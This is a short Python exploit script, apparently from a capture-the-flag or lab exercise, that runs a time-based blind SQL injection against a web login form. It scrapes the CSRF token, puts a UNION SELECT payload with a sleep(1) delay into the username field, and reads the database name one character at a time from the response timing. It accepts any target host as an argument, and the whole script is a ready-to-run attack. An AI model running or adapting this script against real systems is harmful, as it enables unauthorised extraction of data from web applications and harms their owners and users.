from datetime import datetime
import requests
import sys
import re

s = requests.Session()
url = "http://" + sys.argv[1] + "/login"
al = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ=$_{}"  # Added common characters
i = 0
word = ""

while True:  # Changed condition
    if i >= len(al):  # If we've tried all characters, we're done with this position
        break

    r1 = s.get(url)
    middleware = re.findall('name="csrfmiddlewaretoken" value="(.*)"', r1.text)

    if not middleware:  # Handle case where CSRF token isn't found
        print("\nCSRF token not found!")
        break

    data = {
        "csrfmiddlewaretoken": middleware[0],
        "username": f"admin' union select 1,2,3,4,5,6,7,8,9,10,11 where database() like binary '{word}{al[i]}%' and sleep(1)-- -",
        "password": "admin"
    }

    start_time = datetime.now()
    r2 = s.post(url, data=data)
    end_time = datetime.now()
    difference = end_time - start_time

    if difference.total_seconds() > 1:
        word = word + al[i]
        print(f"\rExtracting: {word}", end='', flush=True)
        i = 0  # Reset to check next position
    else:
        i += 1  # Try next character
        sys.stdout.write(f"\rTrying: {word}{al[i] if i < len(al) else ''}".ljust(50))
        sys.stdout.flush()

print(f"\n\nDatabase name: {word}")
